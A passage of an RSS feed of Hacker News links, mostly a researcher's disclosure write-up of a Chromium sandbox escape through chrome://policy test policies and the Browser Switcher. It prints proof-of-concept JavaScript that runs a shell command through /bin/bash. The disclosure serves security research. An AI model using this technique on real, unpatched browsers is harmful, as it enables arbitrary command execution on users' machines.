            <description><![CDATA[<p>URL: <a href="https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2">https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2</a>, See on <a href="https://news.ycombinator.com/item?id=41869460">Hacker News</a></p>
<div id="readability-page-1" class="page">




<header data-testid="navbar">
<a href="#content-body">Skip to content</a>
<div>
<nav aria-label="Explore GitLab">
<div>
<span>GitLab</span>
<a title="Homepage" id="logo" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="https://gitlab.com/"><svg aria-hidden="true" role="img" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z" fill="#E24329"></path>
  <path d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z" fill="#FC6D26"></path>
  <path d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z" fill="#FCA326"></path>
  <path d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z" fill="#FC6D26"></path>
</svg>

</a></div>
<ul>
<li>

<div>
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="https://gitlab.com/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="https://gitlab.com/explore">Explore</a>
</li>
</ul>
<ul>
<li>
<a href="https://gitlab.com/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li>
<a href="https://gitlab.com/users/sign_up"><span>
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div>



<div data-testid="top-bar">
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">


</div>


</div>

<div>
<main id="content-body" itemscope="" itemtype="http://schema.org/SoftwareSourceCode">












</main>
</div>


</div>








</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cats are (almost) liquid (178 pts)]]></title>
            <link>https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8</link>
            <guid>41868683</guid>
            <pubDate>Thu, 17 Oct 2024 11:43:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8">https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8</a>, See on <a href="https://news.ycombinator.com/item?id=41868683">Hacker News</a></p>
Couldn't get https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Escaping the Chrome Sandbox Through DevTools (359 pts)]]></title>
            <link>https://ading.dev/blog/posts/chrome_sandbox_escape.html</link>
            <guid>41866802</guid>
            <pubDate>Thu, 17 Oct 2024 05:55:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ading.dev/blog/posts/chrome_sandbox_escape.html">https://ading.dev/blog/posts/chrome_sandbox_escape.html</a>, See on <a href="https://news.ycombinator.com/item?id=41866802">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content_wrapper">
        
  
  <p><i>By ading2210 on 10/16/24</i></p>
  <h2>Introduction</h2>
<p>This blog post details how I found CVE-2024-6778 and CVE-2024-5836, which are vulnerabilities within the Chromium web browser which allowed for a sandbox escape from a browser extension (with a tiny bit of user interaction). Eventually, Google paid me $20,000 for this bug report. </p>
<p>In short, these bugs allowed a malicious Chrome extension to run any shell command on your PC, which might then be used to install some even worse malware. Instead of merely stealing your passwords and compromising your browser, an attacker could take control of your entire operating system. </p>
<h2>WebUIs and the Chrome Sandbox</h2>
<p>All untrusted code that Chromium runs is sandboxed, which means that it runs in an isolated environment that cannot access anything it's not supposed to. In practice, this means that the Javascript code that runs in a Chrome extension can only interact with itself and the Javascript APIs it has access to. Which APIs an extension has access to is dependent on the <a href="https://developer.chrome.com/docs/extensions/reference/permissions-list">permissions</a> that the user grants it. However, the worst that you can really do with these permissions is steal someone's logins and browser history. Everything is supposed to stay contained to within the browser.</p>
<p>Additionally, Chromium has a few webpages that it uses for displaying its GUI, using a mechanism called <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md">WebUI</a>. These are prefixed with the <code>chrome://</code> URL protocol, and include ones you've probably used like <code>chrome://settings</code> and <code>chrome://history</code>. Their purpose is to provide the user-facing UI for Chromium's features, while being written with web technologies such as HTML, CSS, and Javascript. Because they need to display and modify information that is specific to the internals of the browser, they are considered to be privileged, which means they have access to private APIs that are used nowhere else. These private APIs allow the Javascript code running on the WebUI frontend to communicate with native C++ code in the browser itself.</p>
<p>Preventing an attacker from accessing WebUIs is important because code that runs on a WebUI page can bypass the Chromium sandbox entirely. For example, on <code>chrome://downloads</code>, clicking on a download for a <code>.exe</code> file will run the executable, and thus if this action was performed via a malicious script, that script can escape the sandbox.</p>
<p>Running untrusted Javascript on <code>chrome://</code> pages is a common attack vector, so the receiving end of these private APIs perform some validation to ensure that they're not doing anything that the user couldn't otherwise do normally. Going back to the <code>chrome://downloads</code> example, Chromium protects against that exact scenario by requiring that to open a file from the downloads page, the action that triggers it has to come from an actual user input and not just Javascript.</p>
<p>Of course, sometimes with these checks there's an edge case that the Chromium developers didn't account for.</p>
<h2>About Enterprise Policies</h2>
<p>My journey towards finding this vulnerability began when I was looking into the Chromium <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/enterprise/policies.md">enterprise policy system</a>. It's intended to be a way for administrators to force certain settings to be applied to devices owned by a company or school. Usually, policies tied to a Google account and are downloaded from Google's own management server. </p>
<p><img alt="The &quot;Your browser is managed by your organization&quot; message." src="https://ading.dev/blog/assets/chrome_sandbox_escape/browser_management_msg.png"></p>
<p>Enterprise policies also include things that the user would not be able to modify normally. For example, one of the things you can do with policies is disable the dino easter egg game:</p>
<p><img alt="alt text" src="https://ading.dev/blog/assets/chrome_sandbox_escape/dino_policy.png"></p>
<p>Moreover, the policies themselves are separated into two categories: user policies and device policies. </p>
<p>Device policies are used to manage settings across an entire Chrome OS device. They can be as simple as restricting which accounts can log in or setting the release channel. Some of them can even change the behavior of the device's firmware (used to prevent developer mode or downgrading the OS). However, because this vulnerability doesn't pertain to Chrome OS, device policies can be ignored for now. </p>
<p>User policies are applied to a specific user or browser instance. Unlike device policies, these are available on all platforms, and they can be set locally rather than relying on Google's servers. On Linux for instance, <a href="https://support.google.com/chrome/a/answer/9027408">placing a JSON file</a> inside <code>/etc/opt/chrome/policies</code> will set the user policies for all instances of Google Chrome on the device. </p>
<p>Setting user policies using this method is somewhat inconvenient since writing to the policies directory requires root permissions. However, what if there was a way to modify these policies without creating a file? </p>
<h2>The Policies WebUI</h2>
<p>Notably, Chromium has a WebUI for viewing the policies applied to the current device, located at <code>chrome://policy</code>. It shows the list of policies applied, the logs for the policy service, and the ability to export these policies to a JSON file.</p>
<p><img alt="A screenshot of the chrome://policy page" src="https://ading.dev/blog/assets/chrome_sandbox_escape/chrome_policy_page.png"></p>
<p>This is nice and all, but normally there's no way to edit the policies from this page. Unless of course, there is an undocumented feature to do exactly that. </p>
<h2>Abusing the Policy Test Page</h2>
<p>When I was doing research on the subject, I came across the following entry in the <a href="https://support.google.com/chrome/a/answer/10314655#117">Chrome Enterprise release notes</a> for Chrome v117:</p>
<blockquote>
<p><strong>Chrome will introduce a chrome://policy/test page</strong><br>
chrome://policy/test will allow customers to test out policies on the Beta, Dev, Canary channels. If there is enough customer demand, we will consider bringing this functionality to the Stable channel. </p>
</blockquote>
<p>As it turns out, this is the only place in Chromium's documentation where this feature is mentioned at all. So with nowhere else to look, I examined the Chromium source code to figure out how it is supposed to work. </p>
<p>Using <a href="https://source.chromium.org/">Chromium Code Search</a>, I did a <a href="https://source.chromium.org/search?q=chrome:%2F%2Fpolicy%2Ftest&amp;sq=">search for <code>chrome://policy/test</code></a>, which led me to the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test.ts;bpv=1;bpt=0;drc=41b2dd136f67dfbfbe5c73cc5dab1699709f340e">JS part of the WebUI code</a> for the policy test page. I then noticed the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test_browser_proxy.ts;bpv=1;bpt=0;drc=0a8c7cff04f5555fb31f50742662fd398ee7febe">private API calls</a> that it uses to set the test policies:</p>
<div><pre><span></span><code><span>export</span><span> </span><span>class</span><span> PolicyTestBrowserProxy </span><span>{</span>
<span>  applyTestPolicies</span><span>(</span><span>policies</span><span>:</span><span> </span><span>string</span><span>,</span><span> profileSeparationResponse</span><span>:</span><span> </span><span>string</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> sendWithPromise</span><span>(</span><span>'setLocalTestPolicies'</span><span>,</span><span> policies</span><span>,</span><span> profileSeparationResponse</span><span>);</span>
<span>  </span><span>}</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Remember how I said that these WebUI pages have access to private APIs? Well, <code>sendWithPromise()</code> is one of these. <code>sendWithPromise()</code> is really just a wrapper for <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md#chrome_send"><code>chrome.send()</code></a>, which sends a request to a handler function written in C++. The handler function can then do whatever it needs to in the internals of the browser, then it may return a value which is passed back to the JS side by <code>sendWithPromise()</code>. </p>
<p>And so, on a whim, I decided to see what calling this in the JS console would do.</p>
<div><pre><span></span><code><span>//import cr.js since we need sendWithPromise</span>
<span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> </span><span>""</span><span>,</span><span> </span><span>""</span><span>);</span>
</code></pre></div>

<p>Unfortunately, running it simply crashed the browser. Interestingly, the following line appeared in the crash log:
<code>[17282:17282:1016/022258.064657:FATAL:local_test_policy_loader.cc(68)] Check failed: policies.has_value() &amp;&amp; policies-&gt;is_list(). List of policies expected</code></p>
<p>It looks like it expects a JSON string with an array of policies as the first argument, which makes sense. Let's provide one then. Luckily <code>policy_test_browser_proxy.ts</code> tells me the format it expects so I don't have to do too much guesswork.</p>
<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
<span>  </span><span>{</span><span> </span>
<span>    name</span><span>:</span><span> </span><span>"AllowDinosaurEasterEgg"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>false,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span><span> </span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>}</span>
<span>]);</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_policy_bug.mp4" type="video/mp4">
  <p>Video info: A demonstration of the policy test page bug.</p>
</video>

<p>So after running this... it just works? I just set an arbitrary user policy by simply running some Javascript on <code>chrome://policy</code>. Clearly something is going wrong here, considering that I never explicitly enabled this feature at all.</p>
<h2>Broken WebUI Validation</h2>
<p>For some context, this is what the policy test page is supposed to look like when it's properly enabled. </p>
<p><img alt="A screenshot of the policy test page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_test_page.png"></p>
<p>To properly enable this page, you have to set the <code>PolicyTestPageEnabled</code> policy (also not documented anywhere). If that policy is not set to begin with, then <code>chrome://policy/test</code> just redirects back to <code>chrome://policy</code>.</p>
<p><img alt="A screenshot of the PolicyTestPageEnabled policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_page_policy.png"></p>
<p>So why was I able to set the test policies regardless of the fact that I had the <code>PolicyTestPageEnabled</code> policy disabled? To investigate this, I looked though Chromium Code Search again and found the <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/policy/policy_ui_handler.cc;l=318-345;drc=ee91a67071b984d80acd62ba9c015577e6c26309;bpv=0;bpt=0">WebUI handler</a> for the <code>setLocalTestPolicies</code> function on the C++ side.</p>
<div><pre><span></span><code><span>void</span><span> </span><span>PolicyUIHandler::HandleSetLocalTestPolicies</span><span>(</span>
<span>    </span><span>const</span><span> base</span><span>::</span><span>Value</span><span>::</span><span>List</span><span>&amp;</span><span> args</span><span>)</span><span> </span><span>{</span>
<span>  std</span><span>::</span><span>string policies </span><span>=</span><span> args</span><span>[</span><span>1</span><span>].</span><span>GetString</span><span>();</span>

<span>  policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*</span><span> local_test_provider </span><span>=</span>
<span>      </span><span>static_cast</span><span>&lt;</span><span>policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*&gt;(</span>
<span>          g_browser_process</span><span>-&gt;</span><span>browser_policy_connector</span><span>()</span>
<span>              </span><span>-&gt;</span><span>local_test_policy_provider</span><span>());</span>

<span>  CHECK</span><span>(</span><span>local_test_provider</span><span>);</span>

<span>  Profile</span><span>::</span><span>FromWebUI</span><span>(</span><span>web_ui</span><span>())</span>
<span>      </span><span>-&gt;</span><span>GetProfilePolicyConnector</span><span>()</span>
<span>      </span><span>-&gt;</span><span>UseLocalTestPolicyProvider</span><span>();</span>

<span>  local_test_provider</span><span>-&gt;</span><span>LoadJsonPolicies</span><span>(</span><span>policies</span><span>);</span>
<span>  AllowJavascript</span><span>();</span>
<span>  ResolveJavascriptCallback</span><span>(</span><span>args</span><span>[</span><span>0</span><span>],</span><span> </span><span>true</span><span>);</span>
<span>}</span>
</code></pre></div>

<p>The only validation that this function performs is that it checks to see if <code>local_test_provider</code> exists, otherwise it crashes the entire browser. Under what conditions will <code>local_test_provider</code> exist, though? </p>
<p>To answer that, I found the code that actually <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/local_test_policy_provider.cc;l=23;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0">creates the local test policy provider</a>. </p>
<div><pre><span></span><code><span>std</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>LocalTestPolicyProvider</span><span>&gt;</span>
<span>LocalTestPolicyProvider</span><span>::</span><span>CreateIfAllowed</span><span>(</span><span>version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>utils</span><span>::</span><span>IsPolicyTestingEnabled</span><span>(</span><span>/*pref_service=*/</span><span>nullptr</span><span>,</span><span> channel</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> base</span><span>::</span><span>WrapUnique</span><span>(</span><span>new</span><span> LocalTestPolicyProvider</span><span>());</span>
<span>  </span><span>}</span>

<span>  </span><span>return</span><span> </span><span>nullptr</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>So this function actually does perform a check to see if the test policies are allowed. If they're not allowed, then it returns null, and attempting to set test policies like I showed earlier will cause a crash.</p>
<p>Maybe <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/policy_utils.cc;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0;l=13"><code>IsPolicyTestingEnabled()</code></a> is misbehaving? Here's what the function looks like:</p>
<div><pre><span></span><code><span>bool</span><span> </span><span>IsPolicyTestingEnabled</span><span>(</span><span>PrefService</span><span>*</span><span> pref_service</span><span>,</span>
<span>                            version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>pref_service </span><span>&amp;&amp;</span>
<span>      </span><span>!</span><span>pref_service</span><span>-&gt;</span><span>GetBoolean</span><span>(</span><span>policy_prefs</span><span>::</span><span>kPolicyTestPageEnabled</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>false</span><span>;</span>
<span>  </span><span>}</span>

<span>  </span><span>if</span><span> </span><span>(</span><span>channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY </span><span>||</span>
<span>      channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEFAULT</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>true</span><span>;</span>
<span>  </span><span>}</span>

<span>  </span><span>return</span><span> </span><span>false</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>This function first checks if <code>kPolicyTestPageEnabled</code> is true, which is the the policy that is supposed to enable the policy test page under normal conditions. However, you may notice that when <code>IsPolicyTestingEnabled()</code> is called, the first argument, the <code>pref_service</code>, is set to null. This causes the check to be ignored entirely.</p>
<p>Now, the only check that remains is for the <code>channel</code>. In this context, "channel" means browser's release channel, which is something like stable, beta, dev, or canary. So in this case, only <code>Channel::CANARY</code> and <code>Channel::DEFAULT</code> is allowed. That must mean that my browser is set to either the <code>Channel::CANARY</code> or <code>Channel::DEFAULT</code>. </p>
<p>Then does the browser <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/common/channel_info_posix.cc;l=29-56;drc=d5cc0de2d29206d08ae4ef0980dfe049cc0344d5;bpv=0;bpt=0">know what channel it's in</a>? Here's the function where it determines that:</p>
<div><pre><span></span><code><span>// Returns the channel state for the browser based on branding and the</span>
<span>// CHROME_VERSION_EXTRA environment variable. In unbranded (Chromium) builds,</span>
<span>// this function unconditionally returns `channel` = UNKNOWN and</span>
<span>// `is_extended_stable` = false. In branded (Google Chrome) builds, this</span>
<span>// function returns `channel` = UNKNOWN and `is_extended_stable` = false for any</span>
<span>// unexpected $CHROME_VERSION_EXTRA value.</span>
<span>ChannelState </span><span>GetChannelImpl</span><span>()</span><span> </span><span>{</span>
<span>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>
<span>  </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>const</span><span> env </span><span>=</span><span> getenv</span><span>(</span><span>"CHROME_VERSION_EXTRA"</span><span>);</span>
<span>  </span><span>const</span><span> std</span><span>::</span><span>string_view env_str </span><span>=</span>
<span>      env </span><span>?</span><span> std</span><span>::</span><span>string_view</span><span>(</span><span>env</span><span>)</span><span> </span><span>:</span><span> std</span><span>::</span><span>string_view</span><span>();</span>

<span>  </span><span>// Ordered by decreasing expected population size.</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"stable"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"extended"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>true</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"beta"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>BETA</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"unstable"</span><span>)</span><span>  </span><span>// linux version of "dev"</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEV</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"canary"</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>}</span>
<span>#endif  // BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>

<span>  </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>UNKNOWN</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>}</span>
</code></pre></div>

<p>If you don't know how the C preprocessor works, the <code>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> part means that the enclosed code will only be compiled if <code>BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> is true. Otherwise that part of the code doesn't exist. Considering that I'm using plain Chromium and not the branded Google Chrome, the channel will always be <code>Channel::UNKNOWN</code>. This also means that, unfortunately, the bug will not work on stable builds of Google Chrome since the release channel is set to the proper value there.</p>
<div><pre><span></span><code><span>enum</span><span> </span><span>class</span><span> </span><span>Channel</span><span> </span><span>{</span>
<span>  UNKNOWN </span><span>=</span><span> </span><span>0</span><span>,</span>
<span>  DEFAULT </span><span>=</span><span> UNKNOWN</span><span>,</span>
<span>  CANARY </span><span>=</span><span> </span><span>1</span><span>,</span>
<span>  DEV </span><span>=</span><span> </span><span>2</span><span>,</span>
<span>  BETA </span><span>=</span><span> </span><span>3</span><span>,</span>
<span>  STABLE </span><span>=</span><span> </span><span>4</span><span>,</span>
<span>};</span>
</code></pre></div>

<p>Looking at the enum definition for the channels, we can see that <code>Channel::UNKNOWN</code> is actually the same as <code>Channel::DEFAULT</code>. Thus, on Chromium and its derivatives, the release channel check in <code>IsPolicyTestingEnabled()</code> always passes, and the function will always return true. </p>
<h2>Sandbox Escape via the Browser Switcher</h2>
<p>So what can I actually do with the ability to set arbitrary user policies? To answer that, I looked at the <a href="https://chromeenterprise.google/policies/">Chrome enterprise policy list</a>. </p>
<p>One of the features present in enterprise policies is the <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/chrome/browser/browser_switcher/README.md">Legacy Browser Support</a> module, also called the Browser Switcher. It's designed to accommodate Internet Explorer users by launching an alternative browser when the user visit certain URLs in Chromium. The behaviors of this feature are all controllable with policies. </p>
<p>The <a href="https://chromeenterprise.google/policies/#AlternativeBrowserPath"><code>AlternativeBrowserPath</code></a> policy stood out in particular. Combined with <a href="https://chromeenterprise.google/policies/#AlternativeBrowserParameters"><code>AlternativeBrowserParameters</code></a>, this lets Chromium launch <em>any shell command</em> as the "alternate browser." However, keep in mind this only works on Linux, MacOS, and Windows, because otherwise the browser switcher policies don't exist.</p>
<p>We can set the following policies to make Chromium launch the calculator, for instance:</p>
<div><pre><span></span><code><span>name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span>
<span>value</span><span>:</span><span> </span><span>true</span>

<span>name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span>
<span>value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>]</span>

<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span>
<span>value</span><span>:</span><span> </span><span>"/bin/bash"</span>

<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span>
<span>value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc</span><span> </span><span>#</span><span> </span><span>${url}"</span><span>]</span><span> </span>
</code></pre></div>

<p>Whenever the browser tries to navigate to <code>example.com</code>, the browser switcher will kick in and launch <code>/bin/bash</code>. <code>["-c", "xcalc # https://example.com"]</code> get passed in as arguments. The <code>-c</code> tells bash to run the command specified in the next argument. You may have noticed that the page URL gets substituted into <code>${url}</code>, and so to prevent this from messing up the command, we can simply put it behind a <code>#</code> which makes it a comment. And thus, we are able to trick Chromium into running <code>/bin/bash -c 'xcalc # https://example.com'</code>.</p>
<p>Utilizing this from the <code>chrome://policy</code> page is rather simple. I can just set these policies using the aforementioned method, and then call <code>window.open("https://example.com")</code> to trigger the browser switcher.</p>
<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
<span>  </span><span>{</span><span> </span><span>//enable the browser switcher feature</span>
<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>true,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the browser switcher to trigger on example.com</span>
<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>],</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the executable path to launch</span>
<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>"/bin/bash"</span><span>,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the arguments for the executable</span>
<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # https://example.com"</span><span>],</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>}</span>
<span>]);</span>

<span>//set the policies listed above</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
<span>//navigate to example.com, which will trigger the browser switcher</span>
<span>window</span><span>.</span><span>open</span><span>(</span><span>"https://example.com"</span><span>)</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_browser_switcher.mp4" type="video/mp4">
  <p>Video info: A demonstration of using the test policies bug and the browser switcher to perform a sandbox escape.</p>
</video>

<p>And that right there is the sandbox escape. We have managed to run an arbitrary shell command via Javascript running on <code>chrome://policy</code>.</p>
<h2>Breaking the Devtools API</h2>
<p>You might have noticed that so far, this attack requires the victim to paste the malicious code into the browser console while they are on <code>chrome://policy</code>. Actually convincing someone to do this would be rather difficult, making the bug useless. So now, my new goal is to somehow run this JS in <code>chrome://policy</code> automatically. </p>
<p>The most likely way this can be done is by creating a malicious Chrome extension. The Chrome extension APIs have a fairly large attack surface, and extensions by their very nature have the ability to inject JS onto pages. However, like I mentioned earlier, extensions are not allowed to run JS on privileged WebUI pages, so I needed to find a way around that.</p>
<p>There are 4 main ways that an extension can execute JS on pages: </p>
<ul>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/scripting"><code>chrome.scripting</code></a>, which directly executes JS in a specific tab.</li>
<li><a href="https://developer.chrome.com/docs/extensions/mv2/reference/tabs"><code>chrome.tabs</code></a> in Manifest v2, which works similarly to how <code>chrome.scripting</code> does.</li>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/debugger"><code>chrome.debugger</code></a> which utilizes the remote debugging protocol.</li>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow</code></a>, which interacts with the inspected page when devtools is open. </li>
</ul>
<p>While investigating this, I decided to look into <code>chrome.devtools.inspectedWindow</code>, as I felt that it was the most obscure and thus least hardened. That assumption turned out to be right.</p>
<p>The way that the <code>chrome.devtools</code> APIs work is that all extensions that use the APIs must have the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools"><code>devtools_page</code> field</a> in their manifest. For example:</p>
<div><pre><span></span><code><span>{</span>
<span>  </span><span>"name"</span><span>:</span><span> </span><span>"example extension"</span><span>,</span>
<span>  </span><span>"version"</span><span>:</span><span> </span><span>"1.0"</span><span>,</span>
